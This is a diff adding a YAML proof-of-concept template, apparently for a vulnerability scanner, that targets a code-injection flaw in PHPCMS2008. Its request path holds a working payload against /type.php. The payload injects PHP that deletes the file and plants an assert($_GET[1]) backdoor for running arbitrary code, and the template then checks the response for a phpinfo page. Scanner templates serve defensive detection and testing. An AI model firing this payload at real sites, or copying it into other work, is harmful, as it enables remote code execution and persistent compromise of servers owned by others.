@@ -1,0 +1,17 @@
+id: poc-yaml-phpcms2008-code-injection
+info:
+  name: PHPCMS2008 PHP 代码注入漏洞利用
+  severity: high
+  tags:
+  - 命令注入
+  finger: PHPCMS2008
+  osprey-id: vb_2018_0053
+requests:
+- method: GET
+  path: /type.php?template=tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss
+  headers: {}
+  expression: 'status == 200 && contains(body, "<title>phpinfo()</title>")
+
+    '
+variables: {}
+transport: http
